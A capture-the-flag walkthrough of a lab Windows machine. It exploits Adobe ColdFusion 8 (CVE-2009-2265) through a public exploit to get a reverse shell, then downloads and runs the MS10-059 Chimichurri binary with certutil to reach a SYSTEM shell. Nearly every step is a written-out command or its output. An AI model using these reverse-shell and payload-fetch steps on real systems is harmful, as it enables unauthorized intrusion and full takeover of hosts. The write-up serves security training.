## Full TCP Port Scan (Aggressive) [235s]

```bash
sudo nmap -Pn -p- -A -T4 10.129.40.241
```

```text
Starting Nmap 7.95 (https://nmap.org) at 2025-03-17 13:31 EDT
Nmap scan report for 10.129.40.241
Host is up (0.059s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|2012|Phone|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   52.09 ms 10.10.16.1
2   76.62 ms 10.129.40.241

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 231.74 seconds
```

## Enumeration

### Port 8500 (HTTP - Adobe ColdFusion 8)
- Directory index exposed
- Version identified: Adobe ColdFusion 8
- Vulnerable to directory traversal and RCE (CVE-2009-2265)

```bash
curl http://10.129.40.241:8500/CFIDE/administrator/
```

## Exploitation

### ColdFusion RCE (CVE-2009-2265)
Exploit script: [Exploit-DB 50057](https://www.exploit-db.com/exploits/50057)

Modify exploit parameters:
```python
lhost = '10.10.16.4'   # Attacker IP
lport = 4444            # Listener port
rhost = "10.129.40.241" # Target IP
rport = 8500            # Target port
```

Start listener:
```bash
nc -lvnp 4444
```

Execute exploit:
```bash
python3 50057.py
```

Reverse shell connection:
```text
connect to [10.10.16.4] from (UNKNOWN) [10.129.40.241] 49260
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>
```

### User Flag
Found in tolis' Desktop:
```cmd
C:\Users\tolis\Desktop> type user.txt
d0c39********************
```

## Privilege Escalation

### System Analysis
- Windows Version: 6.1.7600 (Windows 7/2008 R2)
- Vulnerable to MS10-059 (Chimichurri)

### Exploit Transfer
On attacker machine:
```bash
python3 -m http.server 8888
```

On target:
```cmd
certutil -urlcache -f http://10.10.16.4:8888/Chimichurri.exe chimi.exe
```

### Privilege Escalation Execution
Start elevated listener:
```bash
nc -lvnp 1234
```

Execute exploit on target:
```cmd
C:\Users\tolis\Desktop> chimi.exe 10.10.16.4 1234
```
```text
/Chimichurri/-->This exploit gives you a Local System shell <BR>
/Chimichurri/-->Changing registry values...<BR>
/Chimichurri/-->Got SYSTEM token...<BR>
/Chimichurri/-->Running reverse shell...<BR>
/Chimichurri/-->Restoring default registry values...<BR>
```

### Root Shell
```text
connect to [10.10.16.4] from (UNKNOWN) [10.129.40.241] 53931
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\tolis\Desktop> whoami
nt authority\system
```

### Root Flag
Found in Administrator's Desktop:
```cmd
C:\Users\Administrator\Desktop> type root.txt
c4ca35******************
```
